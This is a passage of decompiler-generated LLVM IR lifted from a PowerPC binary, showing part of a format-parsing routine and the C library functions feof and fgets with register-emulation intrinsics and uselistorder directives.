  %v4_10009514 = zext i8 %v3_10009514 to i32
  store i32 %v4_10009514, i32* %r0.global-to-local, align 4
  store i32 %v1_10009514, i32* @r8, align 4
  %v3_10009518 = icmp eq i8 %v3_10009514, 0
  br i1 %v3_10009518, label %dec_label_pc_10009520, label %dec_label_pc_100094b0

dec_label_pc_10009520:                            ; preds = %dec_label_pc_10009514, %dec_label_pc_100094e4
  %v0_10009520 = phi i32 [ %v2_1000950c, %dec_label_pc_100094e4 ], [ %v3_100094a0, %dec_label_pc_10009514 ]
  store i32 %v0_10009520, i32* %stack_var_-96, align 4
  %v0_10009524 = load i32, i32* %r6.global-to-local, align 4
  %v1_10009524 = call i32 @__asm_rlwinm(i32 %v0_10009524, i32 30, i32 31, i32 31)
  %not.v2_10009528 = icmp eq i32 %v1_10009524, 0
  %v6_1000952c = sext i1 %not.v2_10009528 to i32
  store i32 %v6_1000952c, i32* %r9.global-to-local, align 4
  %v1_10009530 = call i32 @__asm_rlwinm(i32 %v1_10009488, i32 0, i32 20, i32 23)
  store i32 %v1_10009530, i32* %r0.global-to-local, align 4
  %v1_10009534 = call i32 @__asm_rlwinm(i32 %v6_1000952c, i32 0, i32 0, i32 27)
  store i32 %v1_10009534, i32* %r9.global-to-local, align 4
  %v0_10009538 = load i32, i32* @r30, align 4
  %v1_10009538 = inttoptr i32 %v0_10009538 to i8*
  %v2_10009538 = load i8, i8* %v1_10009538, align 1
  %v3_10009538 = zext i8 %v2_10009538 to i32
  store i32 %v3_10009538, i32* %r10.global-to-local, align 4
  %v0_1000953c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000953c = call i32 @__asm_rlwinm(i32 %v0_1000953c, i32 0, i32 30, i32 28)
  %v1_10009540 = add i32 %v1_10009534, 48
  store i32 %v1_10009540, i32* %r9.global-to-local, align 4
  %v2_10009544 = or i32 %v1_1000953c, %v1_10009530
  store i32 %v2_10009544, i32* %r11.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v0_1000954c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000954c = load i32, i32* @r28, align 4
  %v2_1000954c = add i32 %v1_1000954c, 12
  %v3_1000954c = inttoptr i32 %v2_1000954c to i32*
  store i32 %v0_1000954c, i32* %v3_1000954c, align 4
  %v0_10009550 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009550 = load i32, i32* @r28, align 4
  %v2_10009550 = add i32 %v1_10009550, 4
  %v3_10009550 = inttoptr i32 %v2_10009550 to i32*
  store i32 %v0_10009550, i32* %v3_10009550, align 4
  %v0_10009554 = load i32, i32* @r31, align 4
  %v1_10009554 = load i32, i32* @r28, align 4
  %v2_10009554 = add i32 %v1_10009554, 8
  %v3_10009554 = inttoptr i32 %v2_10009554 to i32*
  store i32 %v0_10009554, i32* %v3_10009554, align 4
  %v0_10009558 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009558 = load i32, i32* @r28, align 4
  %v2_10009558 = add i32 %v1_10009558, 20
  %v3_10009558 = inttoptr i32 %v2_10009558 to i32*
  store i32 %v0_10009558, i32* %v3_10009558, align 4
  %v0_1000955c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000955c = load i32, i32* @r28, align 4
  %v2_1000955c = add i32 %v1_1000955c, 16
  %v3_1000955c = inttoptr i32 %v2_1000955c to i32*
  store i32 %v0_1000955c, i32* %v3_1000955c, align 4
  %v0_10009560 = load i32, i32* @r7, align 4
  %v1_10009560 = load i32, i32* @r28, align 4
  %v2_10009560 = add i32 %v1_10009560, 28
  %v3_10009560 = inttoptr i32 %v2_10009560 to i32*
  store i32 %v0_10009560, i32* %v3_10009560, align 4
  %v0_10009564 = load i32, i32* @r8, align 4
  %v1_10009564 = inttoptr i32 %v0_10009564 to i8*
  %v2_10009564 = load i8, i8* %v1_10009564, align 1
  %v3_10009564 = zext i8 %v2_10009564 to i32
  store i32 %v3_10009564, i32* %r9.global-to-local, align 4
  %v3_10009568 = icmp eq i8 %v2_10009564, 0
  br i1 %v3_10009568, label %dec_label_pc_10009570, label %dec_label_pc_10009588

dec_label_pc_10009570:                            ; preds = %dec_label_pc_10009520
  %v0_10009570 = load i32, i32* @r30, align 4
  %v1_10009570 = inttoptr i32 %v0_10009570 to i8*
  %v2_10009570 = load i8, i8* %v1_10009570, align 1
  %v3_10009570 = zext i8 %v2_10009570 to i32
  store i32 %v3_10009570, i32* %r0.global-to-local, align 4
  %v3_10009574 = icmp eq i8 %v2_10009570, 109
  br i1 %v3_10009574, label %dec_label_pc_1000957c, label %dec_label_pc_100096c0

dec_label_pc_1000957c:                            ; preds = %dec_label_pc_10009570
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_10009580 = load i32, i32* @r28, align 4
  %v2_10009580 = add i32 %v1_10009580, 28
  %v3_10009580 = inttoptr i32 %v2_10009580 to i32*
  store i32 %v3_10009564, i32* %v3_10009580, align 4
  %v0_10009584 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009584 = load i32, i32* @r28, align 4
  %v2_10009584 = add i32 %v1_10009584, 32
  %v3_10009584 = inttoptr i32 %v2_10009584 to i32*
  store i32 %v0_10009584, i32* %v3_10009584, align 4
  br label %dec_label_pc_10009588

dec_label_pc_10009588:                            ; preds = %dec_label_pc_10009520, %dec_label_pc_1000957c
  %v0_10009588 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_10009588, 1
  br i1 %tmp62, label %dec_label_pc_10009664, label %dec_label_pc_10009590

dec_label_pc_10009590:                            ; preds = %dec_label_pc_10009588
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10009594

dec_label_pc_10009594:                            ; preds = %dec_label_pc_1000964c, %dec_label_pc_10009590
  %v0_100095bc = phi i32 [ 0, %dec_label_pc_10009590 ], [ %v1_10009650, %dec_label_pc_1000964c ]
  %v2_10009594 = icmp sgt i32 %v0_100095bc, 2
  br i1 %v2_10009594, label %dec_label_pc_100095b8, label %dec_label_pc_1000959c

dec_label_pc_1000959c:                            ; preds = %dec_label_pc_10009594
  %v1_1000959c = mul i32 %v0_100095bc, 4
  store i32 %v1_1000959c, i32* %r0.global-to-local, align 4
  %v0_100095a0 = load i32, i32* @r1, align 4
  %v2_100095a0 = add i32 %v0_100095a0, %v1_1000959c
  store i32 %v2_100095a0, i32* %r9.global-to-local, align 4
  %v1_100095a4 = add i32 %v2_100095a0, 20
  %v2_100095a4 = inttoptr i32 %v1_100095a4 to i32*
  %v3_100095a4 = load i32, i32* %v2_100095a4, align 4
  store i32 %v3_100095a4, i32* %r0.global-to-local, align 4
  %v1_100095a8 = load i32, i32* @r28, align 4
  %v2_100095a8 = add i32 %v1_100095a8, %v0_100095bc
  store i32 %v2_100095a8, i32* %r9.global-to-local, align 4
  %v1_100095ac = urem i32 %v3_100095a4, 256
  store i32 %v1_100095ac, i32* %r11.global-to-local, align 4
  %v1_100095b0 = trunc i32 %v3_100095a4 to i8
  %v3_100095b0 = add i32 %v2_100095a8, 36
  %v4_100095b0 = inttoptr i32 %v3_100095b0 to i8*
  store i8 %v1_100095b0, i8* %v4_100095b0, align 1
  %v0_100095c4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100095c4

dec_label_pc_100095b8:                            ; preds = %dec_label_pc_10009594
  %v2_100095bc = add i32 %v0_100095bc, %stack_var_-84.3
  store i32 %v2_100095bc, i32* %r9.global-to-local, align 4
  %v1_100095c0 = add i32 %v2_100095bc, -2
  store i32 %v1_100095c0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100095c4

dec_label_pc_100095c4:                            ; preds = %dec_label_pc_1000959c, %dec_label_pc_100095b8
  %v0_100095e4 = phi i32 [ %v0_100095c4.pre, %dec_label_pc_1000959c ], [ %v1_100095c0, %dec_label_pc_100095b8 ]
  %v1_100095c4 = load i32, i32* @r26, align 4
  %v3_100095c4 = icmp sgt i32 %v0_100095e4, %v1_100095c4
  br i1 %v3_100095c4, label %dec_label_pc_100095cc, label %dec_label_pc_100095d8

dec_label_pc_100095cc:                            ; preds = %dec_label_pc_100095c4
  %v2_100095cc = icmp sgt i32 %v0_100095e4, 9
  br i1 %v2_100095cc, label %dec_label_pc_100096c0, label %dec_label_pc_100095d4

dec_label_pc_100095d4:                            ; preds = %dec_label_pc_100095cc
  store i32 %v0_100095e4, i32* @r26, align 4
  br label %dec_label_pc_100095d8

dec_label_pc_100095d8:                            ; preds = %dec_label_pc_100095c4, %dec_label_pc_100095d4
  store i32 %v2_10009274.pre-phi, i32* %r9.global-to-local, align 4
  %v0_100095dc = load i32, i32* @r27, align 4
  %v1_100095dc = mul i32 %v0_100095dc, 4
  store i32 %v1_100095dc, i32* %r0.global-to-local, align 4
  %v2_100095e0 = add i32 %v1_100095dc, %v2_10009274.pre-phi
  %v3_100095e0 = inttoptr i32 %v2_100095e0 to i32*
  %v4_100095e0 = load i32, i32* %v3_100095e0, align 4
  store i32 %v4_100095e0, i32* @r31, align 4
  %v1_100095e4 = add i32 %v0_100095e4, -1
  store i32 %v1_100095e4, i32* @r25, align 4
  %v1_100095e8 = mul i32 %v1_100095e4, 4
  %v3_100095ec = icmp eq i32 %v4_100095e0, 8
  %v1_100095f0 = load i32, i32* @r28, align 4
  %v2_100095f0 = add i32 %v1_100095f0, %v1_100095e8
  store i32 %v2_100095f0, i32* %r9.global-to-local, align 4
  %v1_100095f4 = add i32 %v2_100095f0, 40
  %v2_100095f4 = inttoptr i32 %v1_100095f4 to i32*
  %v3_100095f4 = load i32, i32* %v2_100095f4, align 4
  store i32 %v3_100095f4, i32* %r3.global-to-local, align 4
  br i1 %v3_100095ec, label %dec_label_pc_1000964c, label %dec_label_pc_100095fc

dec_label_pc_100095fc:                            ; preds = %dec_label_pc_100095d8
  %v3_100095fc = icmp eq i32 %v3_100095f4, 8
  br i1 %v3_100095fc, label %dec_label_pc_10009634, label %dec_label_pc_10009604

dec_label_pc_10009604:                            ; preds = %dec_label_pc_100095fc
  %v4_10009604 = icmp eq i32 %v3_100095f4, %v4_100095e0
  br i1 %v4_10009604, label %dec_label_pc_10009634, label %dec_label_pc_1000960c

dec_label_pc_1000960c:                            ; preds = %dec_label_pc_10009604
  %v1_1000960c = call i32 @_promoted_size(i32 %v3_100095f4)
  store i32 %v1_1000960c, i32* @r29, align 4
  %v0_10009614 = load i32, i32* @r31, align 4
  store i32 %v0_10009614, i32* %r3.global-to-local, align 4
  %v1_10009618 = call i32 @_promoted_size(i32 %v0_10009614)
  store i32 %v1_10009618, i32* %r3.global-to-local, align 4
  %v0_10009624 = call i32 @__asm_mfcr()
  store i32 %v0_10009624, i32* %r3.global-to-local, align 4
  store i32 %v0_10009624, i32* %r0.global-to-local, align 4
  %v1_10009628 = call i32 @__asm_rlwinm(i32 %v0_10009624, i32 31, i32 31, i32 31)
  store i32 %v1_10009628, i32* %r0.global-to-local, align 4
  %v3_1000962c = icmp eq i32 %v1_10009628, 0
  br i1 %v3_1000962c, label %dec_label_pc_1000964c, label %dec_label_pc_1000960c.dec_label_pc_10009634_crit_edge

dec_label_pc_1000960c.dec_label_pc_10009634_crit_edge: ; preds = %dec_label_pc_1000960c
  %v0_10009638.pre = load i32, i32* @r27, align 4
  %v0_10009640.pre = load i32, i32* @r25, align 4
  %v1_10009644.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10009634

dec_label_pc_10009634:                            ; preds = %dec_label_pc_1000960c.dec_label_pc_10009634_crit_edge, %dec_label_pc_10009604, %dec_label_pc_100095fc
  %v1_10009644 = phi i32 [ %v1_10009644.pre, %dec_label_pc_1000960c.dec_label_pc_10009634_crit_edge ], [ %v1_100095f0, %dec_label_pc_10009604 ], [ %v1_100095f0, %dec_label_pc_100095fc ]
  %v0_10009640 = phi i32 [ %v0_10009640.pre, %dec_label_pc_1000960c.dec_label_pc_10009634_crit_edge ], [ %v1_100095e4, %dec_label_pc_10009604 ], [ %v1_100095e4, %dec_label_pc_100095fc ]
  %v0_10009638 = phi i32 [ %v0_10009638.pre, %dec_label_pc_1000960c.dec_label_pc_10009634_crit_edge ], [ %v0_100095dc, %dec_label_pc_10009604 ], [ %v0_100095dc, %dec_label_pc_100095fc ]
  store i32 %v2_10009274.pre-phi, i32* %r9.global-to-local, align 4
  %v1_10009638 = mul i32 %v0_10009638, 4
  store i32 %v1_10009638, i32* %r0.global-to-local, align 4
  %v2_1000963c = add i32 %v1_10009638, %v2_10009274.pre-phi
  %v3_1000963c = inttoptr i32 %v2_1000963c to i32*
  %v4_1000963c = load i32, i32* %v3_1000963c, align 4
  store i32 %v4_1000963c, i32* %r0.global-to-local, align 4
  %v1_10009640 = mul i32 %v0_10009640, 4
  %v2_10009644 = add i32 %v1_10009640, %v1_10009644
  store i32 %v2_10009644, i32* %r9.global-to-local, align 4
  %v2_10009648 = add i32 %v2_10009644, 40
  %v3_10009648 = inttoptr i32 %v2_10009648 to i32*
  store i32 %v4_1000963c, i32* %v3_10009648, align 4
  br label %dec_label_pc_1000964c

dec_label_pc_1000964c:                            ; preds = %dec_label_pc_1000960c, %dec_label_pc_100095d8, %dec_label_pc_10009634
  %v0_1000964c = load i32, i32* @r28, align 4
  %v1_1000964c = add i32 %v0_1000964c, 28
  %v2_1000964c = inttoptr i32 %v1_1000964c to i32*
  %v3_1000964c = load i32, i32* %v2_1000964c, align 4
  %v0_10009650 = load i32, i32* @r27, align 4
  %v1_10009650 = add i32 %v0_10009650, 1
  store i32 %v1_10009650, i32* @r27, align 4
  %v1_10009654 = add i32 %v3_1000964c, 2
  store i32 %v1_10009654, i32* %r9.global-to-local, align 4
  %v2_10009658 = icmp slt i32 %v1_10009650, %v1_10009654
  br i1 %v2_10009658, label %dec_label_pc_10009594, label %dec_label_pc_1000967c

dec_label_pc_10009664:                            ; preds = %dec_label_pc_10009588
  %v0_10009664 = load i32, i32* @r28, align 4
  %v1_10009664 = add i32 %v0_10009664, 28
  %v2_10009664 = inttoptr i32 %v1_10009664 to i32*
  %v3_10009664 = load i32, i32* %v2_10009664, align 4
  store i32 %v3_10009664, i32* %r5.global-to-local, align 4
  %v1_10009668 = add i32 %v0_10009664, 40
  store i32 %v1_10009668, i32* @r3, align 4
  %v0_1000966c = load i32, i32* @r7, align 4
  %v1_1000966c = trunc i32 %v0_1000966c to i8
  %v3_1000966c = add i32 %v0_10009664, 38
  %v4_1000966c = inttoptr i32 %v3_1000966c to i8*
  store i8 %v1_1000966c, i8* %v4_1000966c, align 1
  %v2_10009670 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10009670, i32* @r4, align 4
  %v0_10009674 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009674 = mul i32 %v0_10009674, 4
  store i32 %v1_10009674, i32* @r5, align 4
  store i32 268473980, i32* @lr, align 4
  %v0_10009678 = call i32 @memcpy()
  store i32 %v0_10009678, i32* %r3.global-to-local, align 4
  %v0_1000967c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000967c

dec_label_pc_1000967c:                            ; preds = %dec_label_pc_1000964c, %dec_label_pc_10009664
  %v0_1000967c = phi i32 [ %v0_1000967c.pre, %dec_label_pc_10009664 ], [ %v0_1000964c, %dec_label_pc_1000964c ]
  %v1_1000967c = add i32 %v0_1000967c, 16
  %v2_1000967c = inttoptr i32 %v1_1000967c to i32*
  %v3_1000967c = load i32, i32* %v2_1000967c, align 4
  store i32 %v3_1000967c, i32* %r0.global-to-local, align 4
  %v0_10009680 = load i32, i32* @r26, align 4
  %v2_10009680 = add i32 %v0_1000967c, 24
  %v3_10009680 = inttoptr i32 %v2_10009680 to i32*
  store i32 %v0_10009680, i32* %v3_10009680, align 4
  %v0_10009684 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009684 = and i32 %v0_10009684, 128
  store i32 %v1_10009684, i32* %r9.global-to-local, align 4
  %v3_10009684 = icmp eq i32 %v1_10009684, 0
  br i1 %v3_10009684, label %dec_label_pc_1000968c, label %dec_label_pc_10009698

dec_label_pc_1000968c:                            ; preds = %dec_label_pc_1000967c
  %v0_1000968c = load i32, i32* @r30, align 4
  %v1_1000968c = add i32 %v0_1000968c, 1
  store i32 %v1_1000968c, i32* %r0.global-to-local, align 4
  %v1_10009690 = load i32, i32* @r28, align 4
  %v2_10009690 = inttoptr i32 %v1_10009690 to i32*
  store i32 %v1_1000968c, i32* %v2_10009690, align 4
  br label %dec_label_pc_100096b0

dec_label_pc_10009698:                            ; preds = %dec_label_pc_1000967c
  %v2_10009698 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_10009698, i32* %r0.global-to-local, align 4
  %v0_1000969c = load i32, i32* @r28, align 4
  %v1_1000969c = inttoptr i32 %v0_1000969c to i32*
  %v2_1000969c = load i32, i32* %v1_1000969c, align 4
  %v1_100096a0 = load i32, i32* @r30, align 4
  %v2_100096a0 = sub i32 %v1_100096a0, %v2_10009698
  %v1_100096a4 = mul i32 %v2_100096a0, 4
  store i32 %v1_100096a4, i32* %r0.global-to-local, align 4
  %v2_100096a8 = add i32 %v1_100096a4, %v2_1000969c
  store i32 %v2_100096a8, i32* %r9.global-to-local, align 4
  store i32 %v2_100096a8, i32* %v1_1000969c, align 4
  br label %dec_label_pc_100096b0

dec_label_pc_100096b0:                            ; preds = %dec_label_pc_1000968c, %dec_label_pc_10009698
  %v0_100096b0 = load i32, i32* @r28, align 4
  %v1_100096b0 = add i32 %v0_100096b0, 28
  %v2_100096b0 = inttoptr i32 %v1_100096b0 to i32*
  %v3_100096b0 = load i32, i32* %v2_100096b0, align 4
  store i32 %v3_100096b0, i32* %r9.global-to-local, align 4
  %v1_100096b4 = add i32 %v3_100096b0, 2
  br label %dec_label_pc_100096c0

dec_label_pc_100096c0:                            ; preds = %dec_label_pc_10009224, %dec_label_pc_100092f8, %dec_label_pc_100093d4, %dec_label_pc_100093c8, %dec_label_pc_100093f0, %dec_label_pc_1000932c, %dec_label_pc_100095cc, %dec_label_pc_1000947c, %dec_label_pc_10009570, %dec_label_pc_100096b0
  %storemerge2 = phi i32 [ %v1_100096b4, %dec_label_pc_100096b0 ], [ -1, %dec_label_pc_10009570 ], [ -1, %dec_label_pc_1000947c ], [ -1, %dec_label_pc_100095cc ], [ -1, %dec_label_pc_1000932c ], [ -1, %dec_label_pc_100093f0 ], [ -1, %dec_label_pc_100093c8 ], [ -1, %dec_label_pc_100093d4 ], [ -1, %dec_label_pc_100092f8 ], [ -1, %dec_label_pc_10009224 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_100091bc, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_100096a4, { 1, 0 }
  uselistorder i32 %v0_1000967c, { 1, 0 }
  uselistorder i32 %v1_10009650, { 1, 2, 0 }
  uselistorder i32 %v1_10009638, { 1, 0 }
  uselistorder i32 %v0_10009624, { 0, 2, 1 }
  uselistorder i32 %v3_100095f4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100095f0, { 1, 2, 0 }
  uselistorder i32 %v1_100095e4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100095dc, { 1, 0 }
  uselistorder i32 %v0_100095dc, { 1, 2, 0 }
  uselistorder i32 %v3_100095a4, { 1, 0, 2 }
  uselistorder i32 %v1_1000959c, { 1, 0 }
  uselistorder i32 %v0_100095bc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10009514, { 1, 2, 0 }
  uselistorder i32 %v1_100094ec, { 2, 1, 0 }
  uselistorder i32 %v1_100094d8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_100094bc, { 1, 0, 2 }
  uselistorder i32 %v1_10009488, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10009444, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10009408, { 0, 3, 2, 1 }
  uselistorder i32 %v1_100093f4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_10009364, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10009360, { 1, 0 }
  uselistorder i32 %v0_10009378, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_100092dc, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_100092d4, { 1, 0 }
  uselistorder i32 %v1_100092c4, { 1, 0 }
  uselistorder i32 %v3_100092bc, { 1, 0, 2 }
  uselistorder i32 %v0_10009338, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_10009308, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_10009298, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10009280, { 1, 0 }
  uselistorder i32 %v2_10009274.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_10009254, { 1, 0 }
  uselistorder i32 %v1_1000923c, { 1, 2, 0 }
  uselistorder i32 %v0_10009230, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 5, 6, 7, 11, 4, 12, 8, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_10012944.585 to i32), { 3, 0, 1, 2 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_10012904.584 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100096c0, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_100096b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000967c, { 1, 0 }
  uselistorder label %dec_label_pc_1000964c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100095d8, { 1, 0 }
  uselistorder label %dec_label_pc_100095c4, { 1, 0 }
  uselistorder label %dec_label_pc_10009588, { 1, 0 }
  uselistorder label %dec_label_pc_100094d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000947c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000942c, { 1, 0 }
  uselistorder label %dec_label_pc_10009400, { 1, 0 }
  uselistorder label %dec_label_pc_100093b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100093b0, { 1, 0 }
  uselistorder label %dec_label_pc_10009324, { 1, 0 }
  uselistorder label %dec_label_pc_1000931c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100092bc, { 1, 0 }
  uselistorder label %dec_label_pc_100092b8, { 1, 0 }
  uselistorder label %dec_label_pc_100092a4, { 1, 0 }
  uselistorder label %dec_label_pc_10009284, { 1, 0 }
  uselistorder label %dec_label_pc_10009280, { 1, 0 }
  uselistorder label %dec_label_pc_10009264, { 1, 0 }
}

define i32 @feof(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100096dc = call i32 @__asm_mfcr()
  store i32 %v0_100096dc, i32* %r31.global-to-local, align 4
  %v2_10009700 = add i32 %v0_100096dc, 52
  %v3_10009700 = inttoptr i32 %v2_10009700 to i32*
  %v4_10009700 = load i32, i32* %v3_10009700, align 4
  %v2_10009704 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10009704, i32* @r3, align 4
  %v3_10009708 = icmp eq i32 %v4_10009700, 0
  store i1 %v3_10009708, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10009708, label %dec_label_pc_1000971c, label %dec_label_pc_1000971c.thread

dec_label_pc_1000971c.thread:                     ; preds = %entry
  %v1_100097243 = inttoptr i32 %v0_100096dc to i16*
  %v2_100097244 = load i16, i16* %v1_100097243, align 2
  %v3_100097245 = zext i16 %v2_100097244 to i32
  store i32 %v3_100097245, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009730

dec_label_pc_1000971c:                            ; preds = %entry
  %v0_10009710 = call i32 @__pthread_return_void()
  %v0_10009718 = call i32 @__pthread_return_0()
  %v0_10009724.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10009728.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  store i32 %v2_10009704, i32* @r3, align 4
  %v1_10009724 = inttoptr i32 %v0_10009724.pre to i16*
  %v2_10009724 = load i16, i16* %v1_10009724, align 2
  %v3_10009724 = zext i16 %v2_10009724 to i32
  store i32 %v3_10009724, i32* %r31.global-to-local, align 4
  br i1 %v0_10009728.pre, label %dec_label_pc_1000972c, label %dec_label_pc_10009730

dec_label_pc_1000972c:                            ; preds = %dec_label_pc_1000971c
  %v0_1000972c = call i32 @__pthread_return_void()
  br label %dec_label_pc_10009730

dec_label_pc_10009730:                            ; preds = %dec_label_pc_1000971c.thread, %dec_label_pc_1000971c, %dec_label_pc_1000972c
  %v3_100097246 = phi i32 [ %v3_100097245, %dec_label_pc_1000971c.thread ], [ %v3_10009724, %dec_label_pc_1000971c ], [ %v3_10009724, %dec_label_pc_1000972c ]
  %v1_10009734 = call i32 @__asm_rlwinm(i32 %v3_100097246, i32 0, i32 29, i32 29)
  %v1_10009744 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100096dc)
  %v9_10009744 = extractvalue %0 %v1_10009744, 7
  store i4 %v9_10009744, i4* @cr4, align 1
  ret i32 %v1_10009734

; uselistorder directives
  uselistorder i32 %v0_100096dc, { 3, 0, 1, 2 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10009730, { 2, 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10009758 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_10009758, i32* %r28.global-to-local, align 4
  %v1_1000977c = add i32 %arg3, 52
  %v2_1000977c = inttoptr i32 %v1_1000977c to i32*
  %v3_1000977c = load i32, i32* %v2_1000977c, align 4
  %v2_10009780 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10009780, i32* @r3, align 4
  %v3_1000978c = icmp eq i32 %v3_1000977c, 0
  store i1 %v3_1000978c, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000978c, label %dec_label_pc_10009794, label %dec_label_pc_100097a0

dec_label_pc_10009794:                            ; preds = %entry
  %v0_10009794 = call i32 @__pthread_return_void()
  %v0_1000979c = call i32 @__pthread_return_0()
  %v0_100097a0.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_100097a4.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100097a8.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100097a0

dec_label_pc_100097a0:                            ; preds = %entry, %dec_label_pc_10009794
  %v0_100097a8 = phi i32 [ %v0_10009758, %entry ], [ %v0_100097a8.pre, %dec_label_pc_10009794 ]
  %v0_100097a4 = phi i32 [ %arg3, %entry ], [ %v0_100097a4.pre, %dec_label_pc_10009794 ]
  %v0_100097a0 = phi i32 [ %arg2, %entry ], [ %v0_100097a0.pre, %dec_label_pc_10009794 ]
  store i32 268474288, i32* @lr, align 4
  %v3_100097ac = inttoptr i32 %v0_100097a8 to i8*
  %v4_100097ac = call i32 @__GI_fgets_unlocked(i8* %v3_100097ac, i32 %v0_100097a0, i32 %v0_100097a4)
  store i32 %v4_100097ac, i32* @r31, align 4
  store i32 %v2_10009780, i32* @r3, align 4
  %v0_100097bc = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100097bc, label %dec_label_pc_100097c0, label %dec_label_pc_100097c4

dec_label_pc_100097c0:                            ; preds = %dec_label_pc_100097a0
  %v0_100097c0 = call i32 @__pthread_return_void()
  %v0_100097c8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100097c4

dec_label_pc_100097c4:                            ; preds = %dec_label_pc_100097a0, %dec_label_pc_100097c0
  %v0_100097c8 = phi i32 [ %v4_100097ac, %dec_label_pc_100097a0 ], [ %v0_100097c8.pre, %dec_label_pc_100097c0 ]
  %v1_100097d8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10009758)
  %v9_100097d8 = extractvalue %0 %v1_100097d8, 7
  store i4 %v9_100097d8, i4* @cr4, align 1
  ret i32 %v0_100097c8

; uselistorder directives
  uselistorder i32 %v0_10009758, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100097c4, { 1, 0 }
  uselistorder label %dec_label_pc_100097a0, { 1, 0 }
}

